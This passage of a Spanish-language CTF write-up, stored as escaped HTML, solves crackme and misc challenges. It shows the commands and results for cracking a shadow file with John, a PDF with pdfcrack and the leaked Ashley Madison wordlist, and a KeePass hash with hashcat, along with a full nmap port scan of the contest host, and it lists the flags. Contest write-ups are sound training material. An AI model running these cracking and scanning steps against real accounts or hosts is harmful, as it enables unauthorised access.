&lt;span class=&#34;n&#34;&gt;lock&lt;/span&gt; &lt;span class=&#34;o&#34;&gt;=&lt;/span&gt; &lt;span class=&#34;n&#34;&gt;lock&lt;/span&gt; &lt;span class=&#34;o&#34;&gt;-&lt;/span&gt; &lt;span class=&#34;n&#34;&gt;lock_pick&lt;/span&gt;
&lt;span class=&#34;k&#34;&gt;print&lt;/span&gt; &lt;span class=&#34;n&#34;&gt;lock&lt;/span&gt;
&lt;span class=&#34;n&#34;&gt;slither&lt;/span&gt; &lt;span class=&#34;o&#34;&gt;=&lt;/span&gt; &lt;span class=&#34;n&#34;&gt;aa&lt;/span&gt; &lt;span class=&#34;o&#34;&gt;+&lt;/span&gt; &lt;span class=&#34;n&#34;&gt;db&lt;/span&gt; &lt;span class=&#34;o&#34;&gt;+&lt;/span&gt; &lt;span class=&#34;n&#34;&gt;nn&lt;/span&gt; &lt;span class=&#34;o&#34;&gt;+&lt;/span&gt; &lt;span class=&#34;n&#34;&gt;ef&lt;/span&gt; &lt;span class=&#34;o&#34;&gt;+&lt;/span&gt; &lt;span class=&#34;n&#34;&gt;rr&lt;/span&gt; &lt;span class=&#34;o&#34;&gt;+&lt;/span&gt; &lt;span class=&#34;n&#34;&gt;gh&lt;/span&gt; &lt;span class=&#34;o&#34;&gt;+&lt;/span&gt; &lt;span class=&#34;n&#34;&gt;lr&lt;/span&gt; &lt;span class=&#34;o&#34;&gt;+&lt;/span&gt; &lt;span class=&#34;n&#34;&gt;ty&lt;/span&gt;
&lt;span class=&#34;k&#34;&gt;print&lt;/span&gt; &lt;span class=&#34;n&#34;&gt;slither&lt;/span&gt;
&lt;span class=&#34;n&#34;&gt;keys&lt;/span&gt; &lt;span class=&#34;o&#34;&gt;=&lt;/span&gt; &lt;span class=&#34;p&#34;&gt;[&lt;/span&gt;&lt;span class=&#34;mi&#34;&gt;112&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;,&lt;/span&gt;&lt;span class=&#34;mi&#34;&gt;97&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;,&lt;/span&gt;&lt;span class=&#34;mi&#34;&gt;115&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;,&lt;/span&gt;&lt;span class=&#34;mi&#34;&gt;115&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;,&lt;/span&gt;&lt;span class=&#34;mi&#34;&gt;119&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;,&lt;/span&gt;&lt;span class=&#34;mi&#34;&gt;111&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;,&lt;/span&gt;&lt;span class=&#34;mi&#34;&gt;114&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;,&lt;/span&gt;&lt;span class=&#34;mi&#34;&gt;100&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;,&lt;/span&gt;&lt;span class=&#34;mi&#34;&gt;33&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;,&lt;/span&gt;&lt;span class=&#34;mi&#34;&gt;33&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;]&lt;/span&gt;
&lt;span class=&#34;k&#34;&gt;print&lt;/span&gt; &lt;span class=&#34;s1&#34;&gt;&amp;#39;Authentication required&amp;#39;&lt;/span&gt;
&lt;span class=&#34;k&#34;&gt;print&lt;/span&gt; &lt;span class=&#34;s1&#34;&gt;&amp;#39;&amp;#39;&lt;/span&gt;
&lt;span class=&#34;n&#34;&gt;user_input&lt;/span&gt; &lt;span class=&#34;o&#34;&gt;=&lt;/span&gt; &lt;span class=&#34;nb&#34;&gt;raw_input&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;(&lt;/span&gt;&lt;span class=&#34;s1&#34;&gt;&amp;#39;Enter your username&lt;/span&gt;&lt;span class=&#34;se&#34;&gt;\n&lt;/span&gt;&lt;span class=&#34;s1&#34;&gt;&amp;#39;&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;)&lt;/span&gt;
&lt;span class=&#34;k&#34;&gt;if&lt;/span&gt; &lt;span class=&#34;n&#34;&gt;user_input&lt;/span&gt; &lt;span class=&#34;o&#34;&gt;==&lt;/span&gt; &lt;span class=&#34;n&#34;&gt;slither&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;:&lt;/span&gt;
  &lt;span class=&#34;k&#34;&gt;print&lt;/span&gt; &lt;span class=&#34;s1&#34;&gt;&amp;#39;yeeeea! correct user!&amp;#39;&lt;/span&gt;
&lt;span class=&#34;k&#34;&gt;else&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;:&lt;/span&gt;
  &lt;span class=&#34;k&#34;&gt;print&lt;/span&gt; &lt;span class=&#34;s1&#34;&gt;&amp;#39;Wrong username try harder&amp;#39;&lt;/span&gt;
  &lt;span class=&#34;nb&#34;&gt;exit&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;()&lt;/span&gt;
&lt;/code&gt;&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;/table&gt;
&lt;/div&gt;
&lt;/div&gt;&lt;p&gt;&lt;code&gt;flag: Owasp!23&lt;/code&gt;&lt;/p&gt;
&lt;h2 id=&#34;crackme2&#34;&gt;CRACKME2&lt;/h2&gt;
&lt;p&gt;Utilizamos rabin2 para obtener las strings dentro del archivo bin y obtuvimos el usuario correcto.&lt;/p&gt;
&lt;p&gt;&lt;img src=&#34;https://sckull.github.io/images/posts/owasp/crackme2.webp&#34; alt=&#34;image&#34; /&gt;&lt;/p&gt;
&lt;p&gt;&lt;code&gt;flag: hax0r&lt;/code&gt;&lt;/p&gt;
&lt;h1 id=&#34;misc&#34;&gt;MISC&lt;/h1&gt;
&lt;h2 id=&#34;shadow&#34;&gt;SHADOW&lt;/h2&gt;
&lt;p&gt;Un archivo que contiene la contraseña del usuario root, usamos john the ripper para obtener la ocnttraseña.&lt;/p&gt;
&lt;p&gt;&lt;img src=&#34;https://sckull.github.io/images/posts/owasp/shadow_john.webp&#34; alt=&#34;image&#34; /&gt;&lt;/p&gt;
&lt;p&gt;&lt;code&gt;flag{toor} &lt;/code&gt;&lt;/p&gt;
&lt;h2 id=&#34;register&#34;&gt;REGISTER&lt;/h2&gt;
&lt;p&gt;La bandera de este reto pertenece al reto de registrarse en la plataforma. &lt;a href=&#34;http://ctf.develsecurity.com/0x1&#34;&gt;http://ctf.develsecurity.com/0x1&lt;/a&gt; En hora buena por tu registro , tu premio es la flag para el reto register en la categoria misc.&lt;/p&gt;
&lt;p&gt;&lt;code&gt;flag{00010!}&lt;/code&gt;&lt;/p&gt;
&lt;h2 id=&#34;pdf&#34;&gt;PDF&lt;/h2&gt;
&lt;p&gt;Utilizamos pdfcrack y el diccionario Ashley Madison. Diccionario: &lt;a href=&#34;https://raw.githubusercontent.com/dustyfresh/dictionaries/master/AshleyMadisonCracked.txt&#34;&gt;https://raw.githubusercontent.com/dustyfresh/dictionaries/master/AshleyMadisonCracked.txt&lt;/a&gt;&lt;/p&gt;
&lt;p&gt;Comando:&lt;/p&gt;
&lt;div class=&#34;highlight&#34;&gt;&lt;div class=&#34;chroma&#34;&gt;
&lt;table class=&#34;lntable&#34;&gt;&lt;tr&gt;&lt;td class=&#34;lntd&#34;&gt;
&lt;pre class=&#34;chroma&#34;&gt;&lt;code&gt;&lt;span class=&#34;lnt&#34;&gt;1
&lt;/span&gt;&lt;/code&gt;&lt;/pre&gt;&lt;/td&gt;
&lt;td class=&#34;lntd&#34;&gt;
&lt;pre class=&#34;chroma&#34;&gt;&lt;code class=&#34;language-bash&#34; data-lang=&#34;bash&#34;&gt;pdfcrack -f flag-protected.pdf -w AshleyMadisonCracked.txt 
&lt;/code&gt;&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;/table&gt;
&lt;/div&gt;
&lt;/div&gt;&lt;p&gt;Contraseña: &lt;code&gt;zerkalo1974&lt;/code&gt;&lt;/p&gt;
&lt;p&gt;&lt;img src=&#34;https://sckull.github.io/images/posts/owasp/pdf_ashley.webp&#34; alt=&#34;image&#34; /&gt;&lt;/p&gt;
&lt;p&gt;&lt;code&gt;flag{pdfcrack_was_here!}&lt;/code&gt;&lt;/p&gt;
&lt;h2 id=&#34;keep&#34;&gt;KEEP&lt;/h2&gt;
&lt;p&gt;Utilizamos &lt;code&gt;keepass2john&lt;/code&gt; para obtener el hash y hashcat para obtener la contraseña del archivo.&lt;/p&gt;
&lt;div class=&#34;highlight&#34;&gt;&lt;div class=&#34;chroma&#34;&gt;
&lt;table class=&#34;lntable&#34;&gt;&lt;tr&gt;&lt;td class=&#34;lntd&#34;&gt;
&lt;pre class=&#34;chroma&#34;&gt;&lt;code&gt;&lt;span class=&#34;lnt&#34;&gt;1
&lt;/span&gt;&lt;/code&gt;&lt;/pre&gt;&lt;/td&gt;
&lt;td class=&#34;lntd&#34;&gt;
&lt;pre class=&#34;chroma&#34;&gt;&lt;code class=&#34;language-text&#34; data-lang=&#34;text&#34;&gt;$keepass$*2*60000*0*cc74b5166afe1df0757d8d208078d4d2f9fe3e331ff730b9cb5cfb94064eea50*b6d616ca2c797d4a942df786640acc92749f8005fc2b31114c0ba5b2aced9a5e*459b7fe3b1200a8b48ad9663925465c4*72cdc691f0f93f79476c83f8b1f1db44ab23ca6217048cd67bbde5e8ff76b402*1acb7f5538987791204995bc3c1ba96a254b3be85051946058b07ee6ef1b4d45
&lt;/code&gt;&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;/table&gt;
&lt;/div&gt;
&lt;/div&gt;&lt;p&gt;Comando hashcat:&lt;/p&gt;
&lt;div class=&#34;highlight&#34;&gt;&lt;div class=&#34;chroma&#34;&gt;
&lt;table class=&#34;lntable&#34;&gt;&lt;tr&gt;&lt;td class=&#34;lntd&#34;&gt;
&lt;pre class=&#34;chroma&#34;&gt;&lt;code&gt;&lt;span class=&#34;lnt&#34;&gt;1
&lt;/span&gt;&lt;/code&gt;&lt;/pre&gt;&lt;/td&gt;
&lt;td class=&#34;lntd&#34;&gt;
&lt;pre class=&#34;chroma&#34;&gt;&lt;code class=&#34;language-bash&#34; data-lang=&#34;bash&#34;&gt;hashcat64.bin -m &lt;span class=&#34;m&#34;&gt;13400&lt;/span&gt; keepas.txt ../rockyou.txt -o keepas_owasp.txt
&lt;/code&gt;&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;/table&gt;
&lt;/div&gt;
&lt;/div&gt;&lt;p&gt;Contraseña: &lt;code&gt;zaq1zaq1&lt;/code&gt;&lt;/p&gt;
&lt;p&gt;Utilizamos &lt;code&gt;keepassx&lt;/code&gt; para abrir el archivo &lt;code&gt;Database.kdbx&lt;/code&gt;.&lt;/p&gt;
&lt;p&gt;&lt;img src=&#34;https://sckull.github.io/images/posts/owasp/keepas_.webp&#34; alt=&#34;image&#34; /&gt;&lt;/p&gt;
&lt;p&gt;Vemos un mensaje de flag pero no aparece nuestra flag como cadena normal, el texto que aparece en el campo de password parece ser base64 invertida, invertimos el mensaje y decodificamos.&lt;/p&gt;
&lt;p&gt;Comando:&lt;/p&gt;
&lt;div class=&#34;highlight&#34;&gt;&lt;div class=&#34;chroma&#34;&gt;
&lt;table class=&#34;lntable&#34;&gt;&lt;tr&gt;&lt;td class=&#34;lntd&#34;&gt;
&lt;pre class=&#34;chroma&#34;&gt;&lt;code&gt;&lt;span class=&#34;lnt&#34;&gt;1
&lt;/span&gt;&lt;/code&gt;&lt;/pre&gt;&lt;/td&gt;
&lt;td class=&#34;lntd&#34;&gt;
&lt;pre class=&#34;chroma&#34;&gt;&lt;code class=&#34;language-bash&#34; data-lang=&#34;bash&#34;&gt;&lt;span class=&#34;nb&#34;&gt;echo&lt;/span&gt; &lt;span class=&#34;o&#34;&gt;=&lt;/span&gt;0HZy92dzNXYw9VZyV3YlNnbx8Fa0FzdfNXYwVWZr91ZuFzahVmcit3ZhxmZ &lt;span class=&#34;p&#34;&gt;|&lt;/span&gt;rev&lt;span class=&#34;p&#34;&gt;|&lt;/span&gt;base64 -d
&lt;/code&gt;&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;/table&gt;
&lt;/div&gt;
&lt;/div&gt;&lt;p&gt;&lt;code&gt;flag{break1ng_keepas_w1th_1nsecure_password}&lt;/code&gt;&lt;/p&gt;
&lt;h2 id=&#34;zero&#34;&gt;ZERO&lt;/h2&gt;
&lt;p&gt;Para este reto escribí un script en python y con el codigo ascii que aparece en el archivo leeme.txt generamos un codigo de barras para luego obtener la bandera en &lt;a href=&#34;https://online-barcode-reader.inliteresearch.com/&#34;&gt;https://online-barcode-reader.inliteresearch.com/&lt;/a&gt;.&lt;/p&gt;
&lt;p&gt;Codigo: &lt;a href=&#34;https://github.com/sckull/ctf-stuff/blob/master/stego_zero.py&#34;&gt;https://github.com/sckull/ctf-stuff/blob/master/stego_zero.py&lt;/a&gt;&lt;/p&gt;
&lt;p&gt;&lt;img src=&#34;https://sckull.github.io/images/posts/owasp/stego_zero.webp&#34; alt=&#34;image&#34; /&gt;&lt;/p&gt;
&lt;p&gt;&lt;code&gt;flag{qr_to_ascii_art}&lt;/code&gt;&lt;/p&gt;
&lt;h2 id=&#34;port&#34;&gt;PORT&lt;/h2&gt;
&lt;p&gt;Para este reto hicimos un escaneo de puertos con nmap a la plataforma del ctf, encontramos el &lt;code&gt;puerto 1337&lt;/code&gt; al visitarlo nos muestra un error con nuestra flag.&lt;/p&gt;
&lt;p&gt;Comando:&lt;/p&gt;
&lt;div class=&#34;highlight&#34;&gt;&lt;div class=&#34;chroma&#34;&gt;
&lt;table class=&#34;lntable&#34;&gt;&lt;tr&gt;&lt;td class=&#34;lntd&#34;&gt;
&lt;pre class=&#34;chroma&#34;&gt;&lt;code&gt;&lt;span class=&#34;lnt&#34;&gt;1
&lt;/span&gt;&lt;/code&gt;&lt;/pre&gt;&lt;/td&gt;
&lt;td class=&#34;lntd&#34;&gt;
&lt;pre class=&#34;chroma&#34;&gt;&lt;code class=&#34;language-bash&#34; data-lang=&#34;bash&#34;&gt;nmap -p1-65535 ctf.develsecurity.com
&lt;/code&gt;&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;/table&gt;
&lt;/div&gt;
&lt;/div&gt;&lt;div class=&#34;highlight&#34;&gt;&lt;div class=&#34;chroma&#34;&gt;
&lt;table class=&#34;lntable&#34;&gt;&lt;tr&gt;&lt;td class=&#34;lntd&#34;&gt;
&lt;pre class=&#34;chroma&#34;&gt;&lt;code&gt;&lt;span class=&#34;lnt&#34;&gt; 1
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt; 2
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt; 3
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt; 4
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt; 5
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt; 6
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt; 7
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt; 8
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt; 9
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;10
&lt;/span&gt;&lt;/code&gt;&lt;/pre&gt;&lt;/td&gt;
&lt;td class=&#34;lntd&#34;&gt;
&lt;pre class=&#34;chroma&#34;&gt;&lt;code class=&#34;language-vim&#34; data-lang=&#34;vim&#34;&gt;&lt;span class=&#34;nx&#34;&gt;PORT&lt;/span&gt;     &lt;span class=&#34;nx&#34;&gt;STATE&lt;/span&gt;    &lt;span class=&#34;nx&#34;&gt;SERVICE&lt;/span&gt; &lt;span class=&#34;nx&#34;&gt;VERSION&lt;/span&gt;&lt;span class=&#34;err&#34;&gt;
&lt;/span&gt;&lt;span class=&#34;err&#34;&gt;&lt;/span&gt;&lt;span class=&#34;m&#34;&gt;22&lt;/span&gt;/&lt;span class=&#34;nx&#34;&gt;tcp&lt;/span&gt;   &lt;span class=&#34;nx&#34;&gt;open&lt;/span&gt;     &lt;span class=&#34;nx&#34;&gt;ssh&lt;/span&gt;     &lt;span class=&#34;nx&#34;&gt;OpenSSH&lt;/span&gt; &lt;span class=&#34;m&#34;&gt;7&lt;/span&gt;.&lt;span class=&#34;m&#34;&gt;2&lt;/span&gt;p&lt;span class=&#34;m&#34;&gt;2&lt;/span&gt; &lt;span class=&#34;nx&#34;&gt;Ubuntu&lt;/span&gt; &lt;span class=&#34;m&#34;&gt;4&lt;/span&gt;ubuntu&lt;span class=&#34;m&#34;&gt;2&lt;/span&gt;.&lt;span class=&#34;m&#34;&gt;8&lt;/span&gt; &lt;span class=&#34;p&#34;&gt;(&lt;/span&gt;&lt;span class=&#34;nx&#34;&gt;Ubuntu&lt;/span&gt; &lt;span class=&#34;nx&#34;&gt;Linux&lt;/span&gt;; &lt;span class=&#34;nx&#34;&gt;protocol&lt;/span&gt; &lt;span class=&#34;m&#34;&gt;2&lt;/span&gt;.&lt;span class=&#34;m&#34;&gt;0&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;)&lt;/span&gt;&lt;span class=&#34;err&#34;&gt;
&lt;/span&gt;&lt;span class=&#34;err&#34;&gt;&lt;/span&gt;&lt;span class=&#34;m&#34;&gt;25&lt;/span&gt;/&lt;span class=&#34;nx&#34;&gt;tcp&lt;/span&gt;   &lt;span class=&#34;nx&#34;&gt;filtered&lt;/span&gt; &lt;span class=&#34;nx&#34;&gt;smtp&lt;/span&gt;&lt;span class=&#34;err&#34;&gt;
&lt;/span&gt;&lt;span class=&#34;err&#34;&gt;&lt;/span&gt;&lt;span class=&#34;m&#34;&gt;80&lt;/span&gt;/&lt;span class=&#34;nx&#34;&gt;tcp&lt;/span&gt;   &lt;span class=&#34;nx&#34;&gt;open&lt;/span&gt;     &lt;span class=&#34;nx&#34;&gt;http&lt;/span&gt;&lt;span class=&#34;err&#34;&gt;
&lt;/span&gt;&lt;span class=&#34;err&#34;&gt;&lt;/span&gt;&lt;span class=&#34;m&#34;&gt;81&lt;/span&gt;/&lt;span class=&#34;nx&#34;&gt;tcp&lt;/span&gt;   &lt;span class=&#34;nx&#34;&gt;open&lt;/span&gt;     &lt;span class=&#34;nx&#34;&gt;http&lt;/span&gt;    &lt;span class=&#34;nx&#34;&gt;Apache&lt;/span&gt; &lt;span class=&#34;nx&#34;&gt;httpd&lt;/span&gt; &lt;span class=&#34;m&#34;&gt;2&lt;/span&gt;.&lt;span class=&#34;m&#34;&gt;4&lt;/span&gt;.&lt;span class=&#34;m&#34;&gt;18&lt;/span&gt; &lt;span class=&#34;p&#34;&gt;((&lt;/span&gt;&lt;span class=&#34;nx&#34;&gt;Ubuntu&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;))&lt;/span&gt;&lt;span class=&#34;err&#34;&gt;
&lt;/span&gt;&lt;span class=&#34;err&#34;&gt;&lt;/span&gt;&lt;span class=&#34;m&#34;&gt;82&lt;/span&gt;/&lt;span class=&#34;nx&#34;&gt;tcp&lt;/span&gt;   &lt;span class=&#34;nx&#34;&gt;open&lt;/span&gt;     &lt;span class=&#34;nx&#34;&gt;http&lt;/span&gt;    &lt;span class=&#34;nx&#34;&gt;Apache&lt;/span&gt; &lt;span class=&#34;nx&#34;&gt;httpd&lt;/span&gt; &lt;span class=&#34;m&#34;&gt;2&lt;/span&gt;.&lt;span class=&#34;m&#34;&gt;4&lt;/span&gt;.&lt;span class=&#34;m&#34;&gt;18&lt;/span&gt; &lt;span class=&#34;p&#34;&gt;((&lt;/span&gt;&lt;span class=&#34;nx&#34;&gt;Ubuntu&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;))&lt;/span&gt;&lt;span class=&#34;err&#34;&gt;
&lt;/span&gt;&lt;span class=&#34;err&#34;&gt;&lt;/span&gt;&lt;span class=&#34;m&#34;&gt;83&lt;/span&gt;/&lt;span class=&#34;nx&#34;&gt;tcp&lt;/span&gt;   &lt;span class=&#34;nx&#34;&gt;open&lt;/span&gt;     &lt;span class=&#34;nx&#34;&gt;http&lt;/span&gt;    &lt;span class=&#34;nx&#34;&gt;Apache&lt;/span&gt; &lt;span class=&#34;nx&#34;&gt;httpd&lt;/span&gt; &lt;span class=&#34;m&#34;&gt;2&lt;/span&gt;.&lt;span class=&#34;m&#34;&gt;4&lt;/span&gt;.&lt;span class=&#34;m&#34;&gt;18&lt;/span&gt; &lt;span class=&#34;p&#34;&gt;((&lt;/span&gt;&lt;span class=&#34;nx&#34;&gt;Ubuntu&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;))&lt;/span&gt;&lt;span class=&#34;err&#34;&gt;
&lt;/span&gt;&lt;span class=&#34;err&#34;&gt;&lt;/span&gt;&lt;span class=&#34;m&#34;&gt;84&lt;/span&gt;/&lt;span class=&#34;nx&#34;&gt;tcp&lt;/span&gt;   &lt;span class=&#34;nx&#34;&gt;open&lt;/span&gt;     &lt;span class=&#34;nx&#34;&gt;http&lt;/span&gt;    &lt;span class=&#34;nx&#34;&gt;Apache&lt;/span&gt; &lt;span class=&#34;nx&#34;&gt;httpd&lt;/span&gt; &lt;span class=&#34;m&#34;&gt;2&lt;/span&gt;.&lt;span class=&#34;m&#34;&gt;4&lt;/span&gt;.&lt;span class=&#34;m&#34;&gt;18&lt;/span&gt; &lt;span class=&#34;p&#34;&gt;((&lt;/span&gt;&lt;span class=&#34;nx&#34;&gt;Ubuntu&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;))&lt;/span&gt;&lt;span class=&#34;err&#34;&gt;
&lt;/span&gt;&lt;span class=&#34;err&#34;&gt;&lt;/span&gt;&lt;span class=&#34;m&#34;&gt;111&lt;/span&gt;/&lt;span class=&#34;nx&#34;&gt;tcp&lt;/span&gt;  &lt;span class=&#34;nx&#34;&gt;open&lt;/span&gt;     &lt;span class=&#34;nx&#34;&gt;rpcbind&lt;/span&gt; &lt;span class=&#34;m&#34;&gt;2-4&lt;/span&gt; &lt;span class=&#34;p&#34;&gt;(&lt;/span&gt;&lt;span class=&#34;nx&#34;&gt;RPC&lt;/span&gt; &lt;span class=&#34;mh&#34;&gt;#100000&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;)&lt;/span&gt;&lt;span class=&#34;err&#34;&gt;
&lt;/span&gt;&lt;span class=&#34;err&#34;&gt;&lt;/span&gt;&lt;span class=&#34;m&#34;&gt;1337&lt;/span&gt;/&lt;span class=&#34;nx&#34;&gt;tcp&lt;/span&gt; &lt;span class=&#34;nx&#34;&gt;open&lt;/span&gt;     &lt;span class=&#34;nx&#34;&gt;waste&lt;/span&gt;?&lt;span class=&#34;err&#34;&gt;
&lt;/span&gt;&lt;/code&gt;&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;/table&gt;
&lt;/div&gt;
&lt;/div&gt;&lt;p&gt;Mensaje al visitar la pagina.&lt;/p&gt;
&lt;div class=&#34;highlight&#34;&gt;&lt;div class=&#34;chroma&#34;&gt;
&lt;table class=&#34;lntable&#34;&gt;&lt;tr&gt;&lt;td class=&#34;lntd&#34;&gt;
&lt;pre class=&#34;chroma&#34;&gt;&lt;code&gt;&lt;span class=&#34;lnt&#34;&gt;1
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;2
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;3
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;4
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;5
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;6
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;7
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;8
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;9
&lt;/span&gt;&lt;/code&gt;&lt;/pre&gt;&lt;/td&gt;
&lt;td class=&#34;lntd&#34;&gt;
&lt;pre class=&#34;chroma&#34;&gt;&lt;code class=&#34;language-vim&#34; data-lang=&#34;vim&#34;&gt;&lt;span class=&#34;nx&#34;&gt;xmp&lt;/span&gt;&amp;amp;&lt;span class=&#34;nx&#34;&gt;gt&lt;/span&gt;;&lt;span class=&#34;nx&#34;&gt;perl&lt;/span&gt;: &lt;span class=&#34;nx&#34;&gt;warning&lt;/span&gt;: &lt;span class=&#34;nx&#34;&gt;Setting&lt;/span&gt; &lt;span class=&#34;nx&#34;&gt;locale&lt;/span&gt; &lt;span class=&#34;nx&#34;&gt;failed&lt;/span&gt;.&lt;span class=&#34;err&#34;&gt;
&lt;/span&gt;&lt;span class=&#34;err&#34;&gt;&lt;/span&gt;&lt;span class=&#34;nx&#34;&gt;perl&lt;/span&gt;: &lt;span class=&#34;nx&#34;&gt;warning&lt;/span&gt;: &lt;span class=&#34;nx&#34;&gt;Please&lt;/span&gt; &lt;span class=&#34;nx&#34;&gt;check&lt;/span&gt; &lt;span class=&#34;nx&#34;&gt;that&lt;/span&gt; &lt;span class=&#34;nx&#34;&gt;your&lt;/span&gt; &lt;span class=&#34;nx&#34;&gt;locale&lt;/span&gt; &lt;span class=&#34;nx&#34;&gt;settings&lt;/span&gt;:&lt;span class=&#34;err&#34;&gt;
&lt;/span&gt;&lt;span class=&#34;err&#34;&gt;&lt;/span&gt; &lt;span class=&#34;nx&#34;&gt;LANGUAGE&lt;/span&gt; &lt;span class=&#34;p&#34;&gt;=&lt;/span&gt; &lt;span class=&#34;p&#34;&gt;(&lt;/span&gt;&lt;span class=&#34;nx&#34;&gt;unset&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;),&lt;/span&gt;&lt;span class=&#34;err&#34;&gt;
&lt;/span&gt;&lt;span class=&#34;err&#34;&gt;&lt;/span&gt; &lt;span class=&#34;nx&#34;&gt;LC_ALL&lt;/span&gt; &lt;span class=&#34;p&#34;&gt;=&lt;/span&gt; &lt;span class=&#34;p&#34;&gt;(&lt;/span&gt;&lt;span class=&#34;nx&#34;&gt;unset&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;),&lt;/span&gt;&lt;span class=&#34;err&#34;&gt;
&lt;/span&gt;&lt;span class=&#34;err&#34;&gt;&lt;/span&gt; &lt;span class=&#34;nx&#34;&gt;LANG&lt;/span&gt; &lt;span class=&#34;p&#34;&gt;=&lt;/span&gt; &lt;span class=&#34;s2&#34;&gt;&amp;#34;es_GT.UTF-8&amp;#34;&lt;/span&gt;&lt;span class=&#34;err&#34;&gt;
&lt;/span&gt;&lt;span class=&#34;err&#34;&gt;&lt;/span&gt;    &lt;span class=&#34;nx&#34;&gt;are&lt;/span&gt; &lt;span class=&#34;nx&#34;&gt;supported&lt;/span&gt; &lt;span class=&#34;nx&#34;&gt;and&lt;/span&gt; &lt;span class=&#34;nx&#34;&gt;installed&lt;/span&gt; &lt;span class=&#34;nx&#34;&gt;on&lt;/span&gt; &lt;span class=&#34;nx&#34;&gt;your&lt;/span&gt; &lt;span class=&#34;nx&#34;&gt;system&lt;/span&gt;.&lt;span class=&#34;err&#34;&gt;
&lt;/span&gt;&lt;span class=&#34;err&#34;&gt;&lt;/span&gt;&lt;span class=&#34;nx&#34;&gt;perl&lt;/span&gt;: &lt;span class=&#34;nx&#34;&gt;warning&lt;/span&gt;: &lt;span class=&#34;nx&#34;&gt;Falling&lt;/span&gt; &lt;span class=&#34;nx&#34;&gt;back&lt;/span&gt; &lt;span class=&#34;nx&#34;&gt;to&lt;/span&gt; &lt;span class=&#34;nx&#34;&gt;the&lt;/span&gt; &lt;span class=&#34;nx&#34;&gt;standard&lt;/span&gt; &lt;span class=&#34;nx&#34;&gt;locale&lt;/span&gt; &lt;span class=&#34;p&#34;&gt;(&lt;/span&gt;&lt;span class=&#34;s2&#34;&gt;&amp;#34;C&amp;#34;&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;)&lt;/span&gt;.&lt;span class=&#34;err&#34;&gt;
&lt;/span&gt;&lt;span class=&#34;err&#34;&gt;&lt;/span&gt;&lt;span class=&#34;nx&#34;&gt;Unescaped&lt;/span&gt; &lt;span class=&#34;nx&#34;&gt;left&lt;/span&gt; &lt;span class=&#34;nx&#34;&gt;brace&lt;/span&gt; &lt;span class=&#34;nx&#34;&gt;in&lt;/span&gt; &lt;span class=&#34;nx&#34;&gt;regex&lt;/span&gt; &lt;span class=&#34;nx&#34;&gt;is&lt;/span&gt; &lt;span class=&#34;nx&#34;&gt;deprecated&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;,&lt;/span&gt; &lt;span class=&#34;nx&#34;&gt;passed&lt;/span&gt; &lt;span class=&#34;nx&#34;&gt;through&lt;/span&gt; &lt;span class=&#34;nx&#34;&gt;in&lt;/span&gt; &lt;span class=&#34;nx&#34;&gt;regex&lt;/span&gt;; &lt;span class=&#34;nx&#34;&gt;marked&lt;/span&gt; &lt;span class=&#34;nx&#34;&gt;by&lt;/span&gt; &lt;span class=&#34;p&#34;&gt;&amp;lt;!--&lt;/span&gt; &lt;span class=&#34;nx&#34;&gt;HERE&lt;/span&gt; &lt;span class=&#34;nx&#34;&gt;in&lt;/span&gt; &lt;span class=&#34;nx&#34;&gt;m&lt;/span&gt;&lt;span class=&#34;sr&#34;&gt;/%{ --&amp;gt; HERE (.*?)}/&lt;/span&gt; &lt;span class=&#34;nx&#34;&gt;at&lt;/span&gt; &lt;span class=&#34;sr&#34;&gt;/usr/&lt;/span&gt;&lt;span class=&#34;nx&#34;&gt;bin&lt;/span&gt;/&lt;span class=&#34;nx&#34;&gt;print&lt;/span&gt; &lt;span class=&#34;nx&#34;&gt;line&lt;/span&gt; &lt;span class=&#34;m&#34;&gt;528&lt;/span&gt;.&lt;span class=&#34;err&#34;&gt;
